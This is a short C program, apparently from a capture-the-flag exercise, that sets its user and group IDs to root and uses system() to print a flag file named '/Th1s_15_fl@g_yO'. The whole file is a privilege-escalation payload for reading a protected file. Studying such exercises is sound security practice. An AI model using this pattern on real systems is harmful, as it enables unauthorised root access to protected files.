#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
void main() {
    seteuid(0);
    setegid(0);
    setuid(0);
    setgid(0);

    system("/bin/cat /Th1s_15_fl@g_yO");
}

